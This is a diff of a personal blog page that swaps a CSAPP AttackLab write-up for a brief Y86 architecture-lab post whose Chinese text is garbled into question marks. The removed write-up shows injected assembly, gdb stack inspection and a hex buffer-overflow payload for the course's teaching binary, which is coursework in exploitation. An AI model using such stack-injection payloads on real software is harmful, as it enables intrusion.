@@ -16,25 +16,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="基础知识x86_64架构(64bit)通用寄存器  rax：通常用于存储函数调用返回值 rsp：栈顶指针，指向栈的顶部 rdi：第一个入参 rsi：第二个入参 rdx：第三个入参 rcx：第四个入参 r8：第五个入参 r9：第六个入参 rbx：数据存储，遵循Callee Save原则 rbp：数据存储，遵循Callee Save原则 r12~r15：数据存储，遵循Callee Save原则 r10">
+    <meta name="description" content="Part A??:??????? Y86-64 ?? ??????example.c???????c???Y86-64?????? ????: 123456#ys?????yo#?sim&#x2F;misc ??????.&#x2F;yas sum.ys#??????#?sim&#x2F;misc .&#x2F;yis sum.yo  ???make???: 12345gcc -O2 -fcommon -c yas-grammar.cg">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CSAPP——AttackLab">
-<meta property="og:url" content="http://example.com/2023/09/30/CSAPP%E2%80%94%E2%80%94AttackLab/index.html">
+<meta property="og:title" content="CSAPP——Architecture lab(Y86)">
+<meta property="og:url" content="http://example.com/2023/10/03/CSAPP%E2%80%94%E2%80%94Architecture-lab-Y86/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="基础知识x86_64架构(64bit)通用寄存器  rax：通常用于存储函数调用返回值 rsp：栈顶指针，指向栈的顶部 rdi：第一个入参 rsi：第二个入参 rdx：第三个入参 rcx：第四个入参 r8：第五个入参 r9：第六个入参 rbx：数据存储，遵循Callee Save原则 rbp：数据存储，遵循Callee Save原则 r12~r15：数据存储，遵循Callee Save原则 r10">
+<meta property="og:description" content="Part A??:??????? Y86-64 ?? ??????example.c???????c???Y86-64?????? ????: 123456#ys?????yo#?sim&#x2F;misc ??????.&#x2F;yas sum.ys#??????#?sim&#x2F;misc .&#x2F;yis sum.yo  ???make???: 12345gcc -O2 -fcommon -c yas-grammar.cg">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/attack-1.png">
-<meta property="og:image" content="http://example.com/images/attack-2.png">
-<meta property="og:image" content="http://example.com/images/attack-3.png">
-<meta property="article:published_time" content="2023-09-30T07:09:10.000Z">
-<meta property="article:modified_time" content="2023-09-30T07:37:09.452Z">
+<meta property="article:published_time" content="2023-10-03T13:23:09.000Z">
+<meta property="article:modified_time" content="2023-10-03T15:35:44.667Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/attack-1.png">
   
   
   
-  <title>CSAPP——AttackLab - Hexo</title>
+  <title>CSAPP——Architecture lab(Y86) - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +196,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CSAPP——AttackLab"></span>
+            <span id="subtitle" data-typed-text="CSAPP——Architecture lab(Y86)"></span>
           
         </div>
 
@@ -211,8 +207,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-30 15:09" pubdate>
-          2023年9月30日 下午
+        <time datetime="2023-10-03 21:23" pubdate>
+          2023年10月3日 晚上
         </time>
       </span>
     
@@ -223,7 +219,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.1k 字
+          374 字
         
       </span>
     
@@ -234,7 +230,7 @@
         
         
         
-          10 分钟
+          4 分钟
         
       </span>
     
@@ -271,51 +267,19 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">CSAPP——AttackLab</h1>
+            <h1 id="seo-header">CSAPP——Architecture lab(Y86)</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="x86-64架构-64bit"><a href="#x86-64架构-64bit" class="headerlink" title="x86_64架构(64bit)"></a>x86_64架构(64bit)</h3><p><strong>通用寄存器</strong></p>
-<ul>
-<li>rax：通常用于存储函数调用返回值</li>
-<li>rsp：栈顶指针，指向栈的顶部</li>
-<li>rdi：第一个入参</li>
-<li>rsi：第二个入参</li>
-<li>rdx：第三个入参</li>
-<li>rcx：第四个入参</li>
-<li>r8：第五个入参</li>
-<li>r9：第六个入参</li>
-<li>rbx：数据存储，遵循Callee Save原则</li>
-<li>rbp：数据存储，遵循Callee Save原则</li>
-<li>r12~r15：数据存储，遵循Callee Save原则</li>
-<li>r10~r11：数据存储，遵循Caller Save原则</li>
-</ul>
-<h2 id="Part-I"><a href="#Part-I" class="headerlink" title="Part I"></a>Part I</h2><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>任务：使得ctarget在执行了getbuf函数之后继续执行touch2函数,而不是返回test函数. 注意要给touch2传参数(cookie).</p>
-<p>具体解题思路如下：</p>
-<ul>
-<li>将正常的返回地址设置成为注入代码的地址，这次注入直接在栈顶注入，即设置为%rsp</li>
-<li>cookie的值写在%rdi里 （在cookie.txt中）</li>
-<li>获取touch2的首地址，这个已经有了</li>
-<li>要调用touch2，却不能用call jmp等命令，所以只能用ret弹出，在弹出之前要先把touch2地址压栈。</li>
-</ul>
-<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p>创建phase2.s文件，写入汇编语言：</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">movq    $0x59b997fa, %rdi   <span class="hljs-comment">#cookie的值写在%rdi里</span><br>pushq   $0x4017ec           <span class="hljs-comment">#touch2的地址</span><br>ret<br></code></pre></td></tr></table></figure>
+                <h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><p><strong>??:??????? Y86-64 ??</strong></p>
+<p>??????example.c???????c???Y86-64??????</p>
+<p>????:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ys?????yo</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">?sim/misc ??????</span><br>./yas sum.ys<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">??????</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">?sim/misc ./yis sum.yo</span><br></code></pre></td></tr></table></figure>
 
-<p>之后编译文件，查看反汇编</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><br>gcc -c phase2<span class="hljs-selector-class">.s</span><br>objdump -d phase2<span class="hljs-selector-class">.o</span><br><br></code></pre></td></tr></table></figure>
-
-<p><img src="/images/attack-1.png" srcset="/img/loading.gif" lazyload></p>
-<p>可以看到这三条指令地址我们就得到了。<br>之后再去找rsp在哪里，借助gdb：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">(gdb) <span class="hljs-keyword">break</span> *<span class="hljs-number">0</span>x4017ac    <br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0</span>x4017ac: file buf.c, line <span class="hljs-number">14</span>.<br>(gdb) run -q<br>Starting program: <span class="hljs-regexp">/home/</span>leyn<span class="hljs-regexp">/csapplab/</span>target1/ctarget -q<br>Cookie: <span class="hljs-number">0</span>x59b997fa<br><br>Breakpoint <span class="hljs-number">1</span>, getbuf () at buf.c:<span class="hljs-number">14</span><br><span class="hljs-number">14</span>	buf.c: 没有那个文件或目录.<br>(gdb) info registers<br>... <span class="hljs-regexp">//</span>省略<br>rsp            <span class="hljs-number">0</span>x5561dc78	<span class="hljs-number">0</span>x5561dc78<br>... <span class="hljs-regexp">//</span>省略<br></code></pre></td></tr></table></figure>
-<p>这里起初我将断点设置在getbuf处，即b getbuf<br>之后运行直接info registers<br>这样得到的rsp的值是错误的，需要利用指令n 步过几步之后再查看，</p>
-<p><img src="/images/attack-2.png" srcset="/img/loading.gif" lazyload></p>
-<p>这样rsp的值也知道了是0x5561dc78。</p>
-<p>创建一个phase2.txt文件，将最终的代码写入：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">48</span> c7 c7 fa <span class="hljs-number">97</span> b9 <span class="hljs-number">59</span> <span class="hljs-number">68</span><br><span class="hljs-attribute">ec</span> <span class="hljs-number">17</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> c3 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><span class="hljs-attribute">78</span> dc <span class="hljs-number">61</span> <span class="hljs-number">55</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br></code></pre></td></tr></table></figure>
-
-<p>最终运行结果：</p>
-<p><img src="/images/attack-3.png" srcset="/img/loading.gif" lazyload></p>
+<p>???make???:</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc -O2 -fcommon -c yas-grammar.c<br>gcc -Wall -O2 -fcommon yas-grammar.o yas.o isa.o -lfl -o yas<br><span class="hljs-regexp">/usr/</span>bin/ld: ??? -lfl: ?????????<br>collect2: error: ld returned <span class="hljs-number">1</span> <span class="hljs-keyword">exit</span> status<br>make: *** [Makefile:<span class="hljs-number">32</span>:yas] ?? <span class="hljs-number">1</span>           <br></code></pre></td></tr></table></figure>
+<p>??????bison flex??,?????�-fcommon�?????Makefiles?</p>
 
                 
               </div>
@@ -333,8 +297,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CSAPP——AttackLab</div>
-      <div>http://example.com/2023/09/30/CSAPP——AttackLab/</div>
+      <div>CSAPP——Architecture lab(Y86)</div>
+      <div>http://example.com/2023/10/03/CSAPP——Architecture-lab-Y86/</div>
     </div>
     <div class="license-meta">
       
@@ -346,7 +310,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月30日</div>
+          <div>2023年10月3日</div>
         </div>
       
       
@@ -378,18 +342,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/10/03/CSAPP%E2%80%94%E2%80%94Architecture-lab-Y86/" title="CSAPP——Architecture lab(Y86)">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CSAPP——Architecture lab(Y86)</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/09/21/Pwn%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%B0%9D%E8%AF%95/" title="Pwn——格式化字符串漏洞初尝试">
-                        <span class="hidden-mobile">Pwn——格式化字符串漏洞初尝试</span>
+                      <a href="/2023/09/30/CSAPP%E2%80%94%E2%80%94AttackLab/" title="CSAPP——AttackLab">
+                        <span class="hidden-mobile">CSAPP——AttackLab</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
